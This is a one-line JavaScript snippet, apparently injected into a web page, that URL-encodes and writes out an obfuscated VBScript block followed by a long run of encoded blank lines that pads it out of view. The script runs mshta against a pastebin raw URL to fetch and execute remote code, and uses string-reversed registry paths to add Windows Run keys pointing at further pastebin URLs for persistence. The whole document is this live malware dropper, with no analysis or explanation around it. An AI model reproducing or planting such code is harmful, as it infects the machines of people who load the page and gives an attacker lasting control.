document.write(unescape(\"%3Cscript%20language%3D%22%3B%26%2366%3B%26%2383%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%22%3E%0A%0ACreateObject%28%22WScript.Shell%22%29.Run%22%22%22mshta%22%22%22http%3A%5C%5Cpastebin.com%5Craw%5CczmZ5N5%22%22%22%0A%0ACreateObject%28%22WScript.Shell%22%29.RegWrite%20strReverse%28%22RAT5%5CnuR%5CnoisevtnerruC%5CswodniW%5CtfosorciM5CerawtfoS%5CCUKH%22%29c%20%22%22%22http%3A%5C%5Cpastebin.com%5Craw%5C5cJEBiiMw%22%22%22%0A%0ACreateObject%28%22WScript.Shell%22%29.RegWrite%20strReverse%28%22F5CnuR%5CnoisevtnerruC%5CswodniW%5CtfosorciM5CerawtfoS%5CCUKH%22%29c%20%22%22%22http%3A%5C%5Cpastebin.com%5Craw%5Cylej2fUy%22%22%22%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0A%0